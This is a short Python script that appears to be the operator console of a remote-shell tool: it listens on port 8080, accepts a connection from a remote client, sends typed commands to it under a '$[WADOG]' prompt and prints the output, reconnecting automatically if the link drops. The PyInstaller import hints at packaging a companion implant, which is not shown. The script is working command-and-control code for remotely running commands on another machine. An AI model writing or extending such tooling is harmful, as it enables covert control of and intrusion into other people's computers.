import socket 
import configparser
import PyInstaller.__main__
import os
from pprint import pprint
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port=8080
host="127.0.0.1"

server.bind((host,port))
server.listen(5)
client,addr=server.accept()
print("conection establishd",addr)
while True:
    try:
        command=input("$[WADOG]>>>")
        if command=='':
            print("Unkown command ?")
        else:
            client.send(command.encode("UTF-8"))
            msg=client.recv(2024)
            print(msg.decode("UTF-8"))
    except (ConnectionAbortedError,ConnectionResetError) as e:
        print(e)
        client,addr=server.accept()
        print("back to online!",addr)